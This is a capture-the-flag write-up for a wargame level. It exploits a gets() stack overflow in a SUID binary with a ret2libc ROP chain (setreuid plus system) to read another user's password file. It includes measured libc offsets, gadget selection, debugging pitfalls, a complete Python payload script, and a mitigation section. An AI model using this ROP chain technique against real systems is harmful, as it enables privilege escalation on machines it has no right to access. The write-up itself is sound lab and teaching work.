# Rainfall — Level 3: NX / Ret2Libc (`armitage`)

**Target:** `armitage` — SUID `flag03` binary, x86-64 Linux
**Goal:** Read `/home/flag03/.pass`
**Technique:** Stack overflow → ROP chain calling `setreuid()` + `system()` from libc
(fixed addresses: no PIE binary + ASLR off). First level where injected code is impossible.

---

## 1. Recon

```
checksec:  NX enabled | No canary | No PIE | Partial RELRO
nm:        gets@plt present, NO win function (no execl anywhere)
```

- **NX kills levels 0/2**: stack bytes are data, never executed → no shellcode.
- **No win function kills level 1's trick** → must call libc code directly: **ret2libc**.
- **No PIE + ASLR off** (verified: `/proc/self/maps` identical across runs) → libc base is
  a constant, no leak needed.
- Bug: `char msg[128]; gets(msg);` — unbounded, again.

## 2. Offset and the .bss plant

```asm
40133e: lea rax,[rbp-0x80]   ; msg → offset to saved RIP = 0x80 + 8 = 136
401345: call gets
401448: leave
401449: ret                  ; ← hijack here (breakpoint for all debugging)
```

Key observation from `nm`: `job_queue` is in `.bss` at fixed **`0x404080`**.
Struct = 3 ints + `payload[128]`, so `job_queue[0].payload = 0x40408c` — and:

```c
strncpy(job_queue[0].payload, msg + 4, MSG_SIZE - 1);   // copies everything after "JOB:"
```

Sending `JOB:cat /home/flag03/.pass` makes the program **plant our argument string at
a fixed known address**. This solves two problems at once: provides `rdi` for `system()`
(no hunting for "/bin/sh" in libc) and sidesteps the `sh -p` problem by using a one-shot
`sh -c` command instead of an interactive shell.

## 3. Assets (measured, same machine, same session)

```
libc base   : 0x7ffff7c00000     (grep libc /proc/self/maps — SELF, not the SUID process)
system      : base + 0x58750     (readelf -sW | grep " system@@")
setreuid    : base + 0x127370    (readelf -sW | grep setreuid)
pop rdi;ret : base + 0x10c08d    (ROPgadget | grep ": pop rdi ; ret")
pop rsi;ret : base + 0x110b7d    (ROPgadget | grep ": pop rsi")
argument    : 0x40408c           (fixed, .bss)
UID flag03  : 1020               (getent passwd flag03 | cut -d: -f3)
```

Gadget-offset rule: ROPgadget/readelf print **offsets inside the libc file** — add the
base. Offsets and base must come from the same file in the same session
(`/lib` → symlink to `/usr/lib`, same file).

**Why `/proc/self/maps`:** reading the SUID process's maps fails — executing a setuid
binary clears the kernel's `dumpable` flag, making `/proc/PID/*` root-owned. With ASLR
off every process maps libc at the same base, so our own maps give the same answer.

## 4. Errors hit on the way — each one a clue

**4.1 Placeholder base left in the script → instant SIGSEGV.**
First payload computed addresses from a copied example `0x7ffff7d95000` instead of the
measured `0x7ffff7c00000` (delta 0x195000, past the end of the mapping). Crash right
after "Job 0 queued". **Clue:** the program consumed exactly 136 bytes and hijacked `ret`
— structure correct, numbers wrong. Rule: never run a script containing a number you
didn't measure in this session.

**4.2 Background measurement attempt → Stopped job + Permission denied.**
`./armitage &` froze: a background process calling `gets()` on a terminal gets SIGTTIN.
And `/proc/PID/maps` was unreadable (see §3). Fix: foreground measurement of `/proc/self`.

**4.3 `system()` ran, `cat` still said Permission denied — the level-0 lesson returns.**
Chain verified in gdb: `pop rdi` ✓, gadget disassembly ✓, `vfork` from system ✓, and
`do_system (line=... "cat /home/flag03/.pass")` — **the argument was perfect**. The denial
came from *inside*: `system()` = `/bin/sh -c "..."`, and dash **drops euid when
ruid ≠ euid** at startup (level 0: fixed by `sh -p`; here we don't control the shell argv).
Level 1 showed the cure: `setreuid(geteuid(), geteuid())` — promote ruid to flag03 *before*
spawning, so dash sees ruid == euid and keeps privileges. Here the cure is built from ROP
gadgets: `pop rdi; UID / pop rsi; UID / setreuid`.

**4.4 SIGSEGV inside `do_system` (system.c:148) with a correct argument → movaps alignment.**
After adding the setreuid slots, `system` crashed on `movaps` — an SSE instruction requiring
16-byte-aligned RSP. ABI: RSP ≡ 8 (mod 16) at function entry; **each ROP slot shifts RSP
by 8**, so alignment is a parity toggle. The extra slots flipped it. Fix: remove the bare
`ret` alignment slot (the same slot that *fixed* alignment in the shorter chain).
Rule: when a libc function faults with a perfect argument, count slots, flip parity.

**4.5 Broken gdb plugin (pwndbg).** gdb startup died with
`PermissionError: /opt/pwndbg/.venv/uv.lock.hash` — root-owned install auto-updating as
user. Fix: `mv ~/.gdbinit ~/.gdbinit.disabled` (the init file sourced the plugin) and run
`gdb -nx -nh` (skip init files). Nothing in levels 0–3 needed pwndbg — vanilla gdb suffices.

**4.6 Gadget list traps.** The `pop rsi` ROPgadget output contained dozens of candidates;
most are unusable: `... ; jmp 0x...` (unknown destination), `; add al,...` (side effects),
`; leave ; ret` (hijacks RSP). Only a clean `pop rsi ; ret` (or `pop rsi ; pop r15 ; ret`
plus one junk qword) is predictable. Verify every gadget with `x/2i <addr>` in gdb before
firing — the breakpoint at `0x401449` guarantees libc is mapped when you check.

## 5. Final exploit

```bash
python3 - <<'EOF'
import struct
LIBC_BASE = 0x7ffff7c00000
POP_RDI  = LIBC_BASE + 0x10c08d
POP_RSI  = LIBC_BASE + 0x110b7d
SETREUID = LIBC_BASE + 0x127370
SYSTEM   = LIBC_BASE + 0x58750
ARG      = 0x40408c
UID      = 1020

line  = b"JOB:cat /home/flag03/.pass\x00"
line += b"A" * (136 - len(line))
line += struct.pack("<Q", POP_RDI)  + struct.pack("<Q", UID)   # setreuid(1020, ...
line += struct.pack("<Q", POP_RSI)  + struct.pack("<Q", UID)   #            ..., 1020)
line += struct.pack("<Q", SETREUID)                            # ruid = euid = flag03
line += struct.pack("<Q", POP_RDI)  + struct.pack("<Q", ARG)   # rdi = command string
line += struct.pack("<Q", SYSTEM)                              # NO ret slot (alignment)
for v in (POP_RDI, POP_RSI, SETREUID, SYSTEM, UID):
    assert b"\x0a" not in struct.pack("<Q", v), hex(v)   # gets() stops at 0x0a
open("/tmp/pwn3","wb").write(line + b"\n")
EOF
./armitage < /tmp/pwn3
```

Execution trace:

```
gets() overflows msg          → 136 filler bytes reach saved RIP
"Job 0 queued" prints         → strncpy planted the command at 0x40408c first
ret → pop rdi;ret             → rdi = 1020
ret → pop rsi;ret             → rsi = 1020
ret → setreuid                → ruid = euid = flag03 (dash can no longer drop)
ret → pop rdi;ret             → rdi = 0x40408c ("cat /home/flag03/.pass")
ret → system                  → /bin/sh -c "cat ..." runs with euid=flag03
flag prints; then SIGSEGV     → post-win, harmless (chain ran off the end)
```

## 6. The three ret2libc failure classes (all three seen this level)

| Symptom | Cause | Diagnosis signature |
|---|---|---|
| SIGSEGV right at hijacked `ret` | wrong libc base → RIP unmapped | crash address ≈ your gadget value, no side effects ran |
| `Permission denied` with NO crash | dash dropped SUID euid | chain ran fully (vfork seen), denial printed by the child |
| SIGSEGV inside `do_system` | stack misalignment (movaps) | gdb shows `line=<your exact string>` — argument perfect |

## 7. How to protect

- **Root cause fix:** replace `gets()` — removed from C11 — with
  `fgets(msg, sizeof(msg), stdin)` (or `read(0, msg, sizeof(msg))`). Overflow becomes
  impossible by construction.
- **Stack canary** (`-fstack-protector-all`): aborts before `ret` ever pops the chain.
  Unlike NX, a canary *does* stop ret2libc — the overwrite is detected regardless of
  what the return address points to.
- **PIE + ASLR** (`-fPIE -pie`, system randomization): the entire chain is 5 hardcoded
  addresses; randomization removes every one of them. The ret2libc shown here requires
  *both* no-PIE *and* ASLR-off; with randomization an attacker needs an info leak first
  (format-string or GOT-read) — the subject of later levels.
- **Full RELRO** (`-z relro -z now`): read-only GOT — blocks the GOT-overwrite variant
  of code reuse.
- **Privilege design:** this binary mirrors level 1's flaws — `system()` reachable in a
  SUID process, attacker-controlled string in fixed `.bss`. A SUID binary should drop
  privileges (`seteuid(getuid())`) **before** reading user input, never call `system()`,
  and its string data must be treated as attacker-controllable memory, not trusted input.

```
Attack step                            Defense that stops it
─────────────────────────────────────  ─────────────────────────────────
gets() overflow                        fgets / bounded read      → no control of RIP
return-address overwrite               stack canary              → abort before ret
hardcoded libc/binary addresses        PIE + ASLR                → chain aims at nothing
setreuid+system gadget chain           Full RELRO (GOT variant)  → harder code reuse
privileged command execution           no system() in SUID code  → nothing to call
read the flag                          file permissions          → last line of defense
```
